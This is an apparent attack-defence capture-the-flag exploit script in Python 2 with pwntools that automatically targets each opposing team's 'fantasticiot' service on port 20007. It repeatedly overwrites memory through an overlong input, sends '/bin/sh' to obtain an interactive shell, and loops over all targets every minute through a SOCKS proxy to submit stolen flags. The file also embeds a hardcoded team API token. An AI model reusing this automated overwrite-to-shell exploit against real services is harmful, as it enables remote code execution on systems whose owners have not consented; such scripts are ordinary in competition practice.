#!/usr/bin/env python2
# -*- coding: utf-8 -*-

import json
from swpag_client import Team # pip install swpag_client
import socks # pip install PySocks
import socket
from pwn import *
import time


def hostToIP(host):
	num = int(host.replace("team",""))
	part = "{0}.{1}".format(129+((num&0xff00)>>8),(num&0xff))
	return "172.31."+part

def runJob(d):
	try:
		s = remote(hostToIP(d['hostname']), 20007, timeout=0.05)
	except:
		return ""

	def overwrite(what, where):
		s.sendline("L")
		s.recv(1024)
		s.sendline("1")
		s.recv(1024)
		s.sendline("AA")
		s.sendline("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+p32(what))
		s.sendline(str(int(where)))

	# any stdout in here gets redirected to the log file
	# you can check this log by either looking at the log file (same directory),
	# or by using the command 'print <job name> [number of lines]' in the launcher

	overwrite("\x08\x05\x10\xa0"[::-1], "134549568")
	overwrite("\x08\x05\x10\x05"[::-1], "6536128")
	overwrite("\x08\x05\x10\x53"[::-1], "247")
	s.sendline("/bin/sh")
	s.sendline("R")
	s.sendline("R")

	s.interactive()

 
def fakeJob(ip):
	return True # Return anything not False here

'''
	   {
           'team_name' : "Team name",
           'hostname' : "hostname",
           'port' : <int port number>,
           'flag_id' : "Flag ID to steal",
           'team_id': <int team id>
       },
'''

if __name__ == "__main__":
	context.proxy=(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 4446)
	socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 4446)
	socket.socket = socks.socksocket
	while(1):
   		t = Team(None, "muVraUlLU7m0MM9dmg4P4auy59t5PFdg")
		targets = t.get_targets("fantasticiot")
		for target in targets:
			flag = runJob(target)
			if (flag):
				t.submit_flag([flag])
		print "Waiting for next round plz"
		time.sleep(60)



